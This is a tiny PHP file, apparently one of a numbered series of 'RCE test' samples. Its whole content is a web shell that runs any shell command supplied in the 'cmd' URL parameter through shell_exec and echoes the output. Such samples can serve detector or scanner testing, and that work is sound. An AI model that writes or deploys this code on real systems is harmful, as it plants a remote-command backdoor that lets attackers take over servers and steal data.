<?php
// RCE test variation #561
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>